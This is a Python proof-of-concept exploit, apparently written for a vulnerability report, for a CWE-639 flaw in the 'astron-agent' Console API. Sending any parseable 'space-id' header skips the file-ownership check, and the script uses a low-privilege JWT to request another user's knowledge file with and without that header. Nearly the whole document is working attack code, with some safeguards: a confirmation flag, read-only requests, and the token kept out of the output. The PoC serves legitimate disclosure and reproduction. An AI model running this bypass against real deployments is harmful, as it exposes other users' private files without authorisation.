#!/usr/bin/env python3
"""
astron-agent-poc V2 — CWE-639 — cross-user knowledge-file read via the space-id header
======================================================================================

The Console knowledge-list endpoint authorises each requested file only when the
client-supplied `space-id` header is absent or unparseable:

    console/backend/toolkit/.../FileInfoV2Service.java:903-930

        Long spaceId = SpaceInfoUtil.getSpaceId();     // parses the request header
        ...
        if (null == spaceId) {
            dataPermissionCheckTool.checkFileBelong(fileInfoV2);   // skipped otherwise
        }

SpaceInfoUtil.getSpaceId() (commons/.../SpaceInfoUtil.java:64-72) returns whatever
`Long.parseLong(header)` accepts. Any parseable value — it need not be the victim's
real space id — makes the ownership check disappear for every file id in the
request. The endpoint still requires a normal authenticated Console session; the
missing check is object-level authorization, not authentication.

Demonstration
-------------
    1. baseline: query the victim file id WITHOUT the header  -> denied / no records
    2. replay the identical request WITH `space-id: 1`        -> knowledge records

Both requests use the SAME low-privilege caller. Step 2 is the defect.

Scope
-----
Strictly read-only; two requests total. The victim file id must be a TEST file on a
deployment you are authorised to test (a file your second test account owns, holding
a benign marker such as TEST_KNOWLEDGE_MARKER). The script prints status codes and
truncated bodies, never the JWT, and exits non-zero if the differential does not
appear.

Usage:
    python3 v2_knowledge_space_id_bypass.py --base http://localhost:8080 \\
        --jwt "$ATTACKER_CONSOLE_JWT" --victim-file-id 9001 --confirm-authorised
"""
import argparse
import json
import sys
import urllib.error
import urllib.request

ENDPOINT = "/file/list-knowledge-by-page"


def die(msg, code=2):
    print(f"[!] {msg}", file=sys.stderr)
    sys.exit(code)


def post(base, jwt, victim_file_id, space_id, timeout=60):
    headers = {
        "Content-Type": "application/json",
        "Authorization": "Bearer " + jwt,
    }
    if space_id is not None:
        headers["space-id"] = space_id
    req = urllib.request.Request(
        base.rstrip("/") + ENDPOINT,
        data=json.dumps({"fileIds": [int(victim_file_id)],
                         "pageNo": 1, "pageSize": 10}).encode(),
        method="POST", headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except urllib.error.URLError as e:
        die(f"cannot reach {base}: {e.reason}", 3)


def summarize(status, body):
    """One-line view that shows whether knowledge records came back, and leaks nothing."""
    try:
        payload = json.loads(body)
    except ValueError:
        return f"http {status}, non-JSON body ({len(body)} bytes)"
    code = payload.get("code")
    data = payload.get("data") or {}
    records = data.get("list") if isinstance(data, dict) else None
    if records is None and isinstance(data, dict):
        for v in data.values():
            if isinstance(v, list):
                records = v
                break
    n = len(records) if isinstance(records, list) else None
    marker = ""
    if isinstance(body, str) and "TEST_KNOWLEDGE_MARKER" in body:
        marker = "  <- TEST_KNOWLEDGE_MARKER present"
    return f"http {status}, code {code}, records returned: {n}{marker}"


def count_records(body):
    """Number of knowledge records in a response body, or None if not parseable."""
    try:
        payload = json.loads(body)
    except ValueError:
        return None
    data = payload.get("data") or {}
    records = data.get("list") if isinstance(data, dict) else None
    if records is None and isinstance(data, dict):
        for v in data.values():
            if isinstance(v, list):
                records = v
                break
    return len(records) if isinstance(records, list) else None


def main():
    ap = argparse.ArgumentParser(description="astron-agent V2 PoC (CWE-639)")
    ap.add_argument("--base", default="http://localhost:8080",
                    help="Console API base URL (default: http://localhost:8080)")
    ap.add_argument("--jwt", required=True,
                    help="the ATTACKER's own low-privilege Console JWT (never printed)")
    ap.add_argument("--victim-file-id", required=True,
                    help="file id owned by another test user/space on this deployment")
    ap.add_argument("--space-id", default="1",
                    help="arbitrary parseable header value (default: 1)")
    ap.add_argument("--confirm-authorised", action="store_true",
                    help="confirm you are authorised to test this deployment")
    args = ap.parse_args()

    if not args.confirm_authorised:
        die("refusing to run without --confirm-authorised")

    print("== step 1: baseline — same caller, same file, NO space-id header ==")
    st1, body1 = post(args.base, args.jwt, args.victim_file_id, None)
    print(f"  POST {ENDPOINT} fileIds=[{args.victim_file_id}] (no header)")
    print(f"    -> {summarize(st1, body1)}")
    print(f"    body[:200]: {body1[:200]!r}")

    print("\n== step 2: replay with an arbitrary space-id header ==")
    st2, body2 = post(args.base, args.jwt, args.victim_file_id, args.space_id)
    print(f"  POST {ENDPOINT} fileIds=[{args.victim_file_id}] space-id: {args.space_id}")
    print(f"    -> {summarize(st2, body2)}")
    print(f"    body[:200]: {body2[:200]!r}")

    # ---- verdict: the differential is the finding
    try:
        ok2 = (st2 == 200 and json.loads(body2).get("code") in (0, "0"))
    except ValueError:
        ok2 = False
    n1, n2 = count_records(body1), count_records(body2)
    marker1 = "TEST_KNOWLEDGE_MARKER" in body1
    marker2 = "TEST_KNOWLEDGE_MARKER" in body2
    # baseline served no victim content; exploit served records or the marker
    denied1 = not marker1 and (n1 is None or n1 == 0)
    got2 = marker2 or (ok2 and n2 is not None and n2 > 0)

    print("\n== verdict ==")
    print(f"  baseline records: {n1}, exploit records: {n2}")
    if got2 and denied1:
        print("  V2 REPRODUCED. The identical caller and file id flip from denied to")
        print(f"  served purely on the presence of a client-supplied space-id header")
        print(f"  (value {args.space_id!r} — not the victim's real space id).")
        return 0
    die("differential not observed — check the preconditions in env/build-and-run.md "
        "(valid low-privilege JWT, victim test file owned by another account)", 6)


if __name__ == "__main__":
    sys.exit(main())
